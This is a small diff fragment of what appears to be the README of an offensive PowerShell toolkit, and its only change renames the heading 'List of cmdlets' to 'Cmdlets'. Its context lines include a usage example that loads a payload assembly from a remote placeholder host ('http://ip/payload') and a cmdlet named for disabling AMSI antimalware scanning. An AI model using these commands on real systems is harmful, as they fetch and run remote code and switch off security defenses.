@@ -52,7 +52,7 @@ Invoke-AssemblyLoader -e $false -l $false -path "http://ip/payload" -name namesp
 
 ```
 
-## List of cmdlets
+## Cmdlets
 
 ```
 Disable-AyEmEsEye
